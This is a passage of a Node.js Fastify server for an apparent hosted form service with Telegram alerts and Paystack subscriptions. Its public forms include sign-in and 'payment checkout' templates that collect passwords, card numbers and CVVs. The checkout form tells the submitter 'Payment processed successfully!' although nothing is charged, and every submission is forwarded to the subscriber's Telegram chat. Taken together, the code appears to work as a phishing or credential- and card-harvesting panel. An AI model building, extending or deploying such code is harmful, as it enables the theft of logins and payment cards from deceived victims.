          const templateField = template.fields.find(f => f.id === fieldId);
          const displayName = customField?.placeholder || templateField?.placeholder || fieldId;
          mappedData[sanitizeForJs(displayName)] = sanitizeForJs(value);
        });

        const submission = new Submission({
          userId,
          formId,
          timestamp: new Date().toISOString(),
          data: mappedData,
        });

        console.log(`Attempting to save submission for ${formId} by user ${userId}:`, submission);

        await submission.save();
        console.log(`Submission saved successfully for form ${formId} by user ${userId}`);

        try {
          const subscription = await Subscription.findOne({
            userId,
            status: 'active',
            endDate: { $gt: new Date() },
          });
          if (subscription) {
            const telegram = await Telegram.findOne({ userId });
            if (telegram && telegram.chatId) {
              const notificationMessage = `New submission received for form ${formId}:\n${Object.entries(mappedData)
                .map(([key, value]) => `${key}: ${value}`)
                .join('\n')}`;
              await bot.telegram.sendMessage(telegram.chatId, notificationMessage);
              console.log(`Sent Telegram notification to chatId ${telegram.chatId} for user ${userId}`);
            } else {
              console.log(`No Telegram chatId found for user ${userId}, skipping notification`);
            }
          } else {
            console.log(`User ${userId} is not subscribed, skipping Telegram notification`);
          }
        } catch (telegramError) {
          console.error('Error sending Telegram notification:', telegramError.message);
        }

        return reply.code(200).send({ message: 'Submission saved successfully' });
      } catch (error) {
        console.error('Error saving submission:', error.message, error.stack);
        return reply.code(500).send({ error: 'Failed to save submission', details: error.message });
      }
    });

    fastify.delete('/form/:id/submission/:index', { preHandler: authenticateToken }, async (req, reply) => {
      const formId = req.params.id;
      const index = parseInt(req.params.index, 10);
      const userId = req.user.userId;

      try {
        const config = await FormConfig.findOne({ formId, userId });
        if (!config) {
          console.error(`User ${userId} does not have access to form ${formId}`);
          return reply.code(403).send({ error: 'Access denied: Form does not belong to you' });
        }
        const adminSettings = await AdminSettings.findOne();
        if (adminSettings.restrictionsEnabled && await isFormExpired(formId)) {
          return reply.code(403).send({ error: 'Form has expired' });
        }

        const userFormSubmissions = await Submission.find({ userId, formId }).sort({ timestamp: 1 });
        if (index < 0 || index >= userFormSubmissions.length) {
          console.error(`Invalid submission index: ${index} for form ${formId} by user ${userId}`);
          return reply.code(404).send({ error: 'Submission not found' });
        }

        const submissionToDelete = userFormSubmissions[index];
        await Submission.deleteOne({ _id: submissionToDelete._id });
        console.log(`Deleted submission at index ${index} for form ${formId} by user ${userId}`);

        return reply.code(200).send({ message: 'Submission deleted successfully' });
      } catch (error) {
        console.error('Error deleting submission:', error.message, error.stack);
        return reply.code(500).send({ error: 'Failed to delete submission', details: error.message });
      }
    });

    fastify.delete('/form/:id', { preHandler: authenticateToken }, async (req, reply) => {
      const formId = req.params.id;
      const userId = req.user.userId;

      try {
        const config = await FormConfig.findOne({ formId, userId });
        if (!config) {
          console.error(`User ${userId} does not have access to form ${formId}`);
          return reply.code(404).send({ error: 'Form not found or access denied' });
        }

        await FormConfig.deleteOne({ formId });
        await Submission.deleteMany({ formId, userId });
        console.log(`Deleted form ${formId} and its submissions for user ${userId}`);

        return reply.code(200).send({ message: 'Form and associated submissions deleted successfully' });
      } catch (error) {
        console.error('Error deleting form:', error.message, error.stack);
        return reply.code(500).send({ error: 'Failed to delete form', details: error.message });
      }
    });

    fastify.get('/submissions', { preHandler: authenticateToken }, async (req, reply) => {
      try {
        const userId = req.user.userId;
        const submissions = await Submission.find({ userId }).sort({ timestamp: -1 });

        const templates = {
          'sign-in': {
            name: 'Sign In Form',
            fields: [
              { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
              { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } },
            ],
          },
          'contact': {
            name: 'Contact Form',
            fields: [
              { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
              { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
            ],
          },
          'payment-checkout': {
            name: 'Payment Checkout Form',
            fields: [
              { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
              { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
              { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } },
            ],
          },
        };

        console.log(`Retrieved ${submissions.length} submissions for user ${userId}`);
        return {
          submissions,
          templates,
          userId,
        };
      } catch (error) {
        console.error('Error fetching submissions:', error.message, error.stack);
        return reply.code(500).send({ error: 'Failed to fetch submissions', details: error.message });
      }
    });

    fastify.get('/form/:id', async (req, reply) => {
      const formId = req.params.id;
      const config = await FormConfig.findOne({ formId });

      if (!config) {
        console.error(`Form not found for ID: ${formId}`);
        return reply.code(404).send('Form not found');
      }

      const adminSettings = await AdminSettings.findOne();
      if (adminSettings.restrictionsEnabled && await isFormExpired(formId)) {
        return reply.code(403).send('Form has expired');
      }

      const templates = {
        'sign-in': {
          name: 'Sign In Form',
          fields: [
            { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
            { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } },
          ],
          buttonText: 'Sign In',
          buttonAction: 'url',
          buttonUrl: '',
          buttonMessage: '',
        },
        'contact': {
          name: 'Contact Form',
          fields: [
            { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
            { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
          ],
          buttonText: 'Submit',
          buttonAction: 'message',
          buttonUrl: '',
          buttonMessage: 'Thank you for contacting us!',
        },
        'payment-checkout': {
          name: 'Payment Checkout Form',
          fields: [
            { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
            { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
            { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } },
          ],
          buttonText: 'Pay Now',
          buttonAction: 'message',
          buttonUrl: '',
          buttonMessage: 'Payment processed successfully!',
        },
      };

      const template = templates[config.template] || templates['sign-in'];
      const fields = template.fields.map(field => {
        const customField = config.placeholders.find(p => p.id === field.id);
        return {
          ...field,
          placeholder: customField ? customField.placeholder : field.placeholder,
        };
      });

      config.placeholders.forEach(p => {
        if (!fields.some(f => f.id === p.id)) {
          fields.push({
            id: p.id,
            placeholder: p.placeholder || template.fields.find(f => f.id === p.id)?.placeholder || 'Enter value',
            type: 'text',
            validation: { required: false },
          });
        }
      });

      const inputCount = fields.length;
      const minHeight = `${300 + (inputCount - template.fields.length) * 40}px`;

      const headerHtml = config.headerText.split('').map((char, i) => {
        if (char === ' ') return '<span class="space"> </span>';
        const color = config.headerColors[i - config.headerText.slice(0, i).split(' ').length + 1] || '';
        return `<span style="color: ${sanitizeForJs(color)}">${sanitizeForJs(char)}</span>`;
      }).join('');

      try {
        return fastify.view('form', {
          templateName: sanitizeForJs(template.name),
          headerHtml,
          subheaderText: sanitizeForJs(config.subheaderText),
          subheaderColor: sanitizeForJs(config.subheaderColor),
          fields,
          borderShadow: sanitizeForJs(config.borderShadow),
          buttonColor: sanitizeForJs(config.buttonColor),
          buttonTextColor: sanitizeForJs(config.buttonTextColor),
          buttonText: sanitizeForJs(config.buttonText),
          buttonAction: sanitizeForJs(config.buttonAction),
          buttonUrl: sanitizeForJs(config.buttonUrl || ''),
          buttonMessage: sanitizeForJs(config.buttonMessage || ''),
          theme: config.theme,
          minHeight,
          template: config.template,
          formId,
          templates: JSON.stringify(templates, (key, value) => {
            if (key === 'regex' && value) return value.toString().slice(1, -1);
            return value;
          }),
        });
      } catch (error) {
        console.error('Error rendering form:', error.message, error.stack);
        return reply.code(500).send('Error rendering form');
      }
    });

    fastify.get('/api/form/:id', { preHandler: authenticateToken }, async (req, reply) => {
      const formId = req.params.id;
      const userId = req.user.userId;

      try {
        const config = await FormConfig.findOne({ formId, userId });
        if (!config) {
          console.error(`Form not found for ID: ${formId}`);
          return reply.code(404).send({ error: 'Form not found' });
        }
        const adminSettings = await AdminSettings.findOne();
        if (adminSettings.restrictionsEnabled && await isFormExpired(formId)) {
          return reply.code(403).send({ error: 'Form has expired' });
        }

        console.log(`Retrieved form config for ${formId} for user ${userId}`);
        return reply.code(200).send({
          ...config.toObject(),
          formId,
          message: 'Form configuration retrieved successfully',
        });
      } catch (error) {
        console.error('Error fetching form config for /api/form/:id:', error.message, error.stack);
        return reply.code(500).send({ error: 'Failed to fetch form configuration', details: error.message });
      }
    });

    const allowedPlans = ['premium-weekly', 'premium-monthly'];
    function isValidPlan(planId) {
      return allowedPlans.includes(planId);
    }

    fastify.post('/api/subscription/initiate-payment', { preHandler: authenticateToken }, async (req, reply) => {
      const { planId, email, price } = req.body;
      const userId = req.user.userId;

      console.log(`Received payment initiation request: userId=${userId}, planId=${planId}, email=${email}, price=${price}`);

      try {
        if (!planId || !email || !price) {
          console.error('Validation failed: Missing required fields');
          return reply.code(400).send({ error: 'Missing required fields: planId, email, and price are required' });
        }

        if (!isValidPlan(planId)) {
          console.error(`Validation failed: Invalid planId: ${planId}`);
          return reply.code(400).send({ error: `Invalid planId. Must be one of: ${allowedPlans.join(', ')}` });
        }

        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
          console.error('Validation failed: Invalid email format');
          return reply.code(400).send({ error: 'Invalid email format' });
        }

        if (!Number.isInteger(price) || price <= 0) {
          console.error('Validation failed: Invalid price');
          return reply.code(400).send({ error: 'Price must be a positive integer' });
        }

        const existingSubscription = await hasActiveSubscription(userId);
        if (existingSubscription && existingSubscription.billingPeriod === planId.split('-')[1]) {
          console.warn(`User ${userId} already has an active ${planId.split('-')[1]} subscription`);
          return reply.code(400).send({ error: `You already have an active ${planId.split('-')[1]} subscription` });
        }

        console.log('Making Paystack API request to /transaction/initialize');
        const response = await axios.post(
          'https://api.paystack.co/transaction/initialize',
          {
            email,
            amount: price,
            metadata: {
              userId,
              planId,
              billingPeriod: planId === 'premium-weekly' ? 'weekly' : 'monthly',
            },
          },
          {
            headers: {
              Authorization: `Bearer ${PAYSTACK_SECRET_KEY}`,
              'Content-Type': 'application/json',
            },
          }
        );

        console.log('Paystack response:', response.data);

        if (!response.data.status || !response.data.data.authorization_url || !response.data.data.reference) {
          console.error('Paystack response missing required fields:', response.data);
          return reply.code(500).send({ error: 'Failed to initialize payment with Paystack' });
        }

        const { authorization_url: authorizationUrl, reference } = response.data.data;

        const subscription = new Subscription({
          userId,
          email,
          planId,
          billingPeriod: planId === 'premium-weekly' ? 'weekly' : 'monthly',
          reference,
          status: 'pending',
          createdAt: new Date().toISOString(),
        });

        console.log('Saving subscription:', subscription);
        await subscription.save();

        return {
          message: 'Payment initiated successfully',
          authorizationUrl,
          reference,
        };
      } catch (error) {
        console.error('Error in /api/subscription/initiate-payment:', {
          message: error.message,
          stack: error.stack,
          axiosError: error.response ? {
            status: error.response.status,
            data: error.response.data,
          } : null,
        });
        return reply.code(500).send({ error: 'Failed to initiate payment' });
      }
    });

    fastify.post('/api/subscription/webhook', { preHandler: verifyPaystackWebhook }, async (req, reply) => {
      console.log('Webhook received:', req.body);

      try {
        const event = req.body;
        if (event.event === 'charge.success') {
          const { reference, metadata, status } = event.data;
          const { userId, planId, billingPeriod } = metadata;

          console.log(`Processing webhook: reference=${reference}, userId=${userId}, planId=${planId}, status=${status}`);

          const subscription = await Subscription.findOne({ reference });
          if (!subscription) {
            console.error(`Webhook error: Subscription not found for reference ${reference}`);
            return reply.code(404).send({ error: 'Subscription not found' });
          }

          await Subscription.updateMany(
            { userId, status: 'active', reference: { $ne: reference } },
            { status: 'inactive', endDate: new Date().toISOString() }
          );

          subscription.status = 'active';
          subscription.startDate = new Date().toISOString();
          subscription.endDate = new Date(
            Date.now() + (billingPeriod === 'weekly' ? 7 * 24 * 60 * 60 * 1000 : 30 * 24 * 60 * 60 * 1000)
          ).toISOString();

          console.log('Updating subscription:', subscription);
          await subscription.save();

          return reply.code(200).send({ message: 'Webhook processed successfully' });
        } else {
          console.log('Webhook ignored: Not a charge.success event');
          return reply.code(200).send({ message: 'Event ignored' });
        }
      } catch (error) {
        console.error('Webhook error:', error.message);
        return reply.code(500).send({ error: 'Failed to process webhook' });
      }
    });

    await fastify.listen({ port, host: '0.0.0.0' });
    console.log(`Server is running on port ${port}`);
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
};

start();
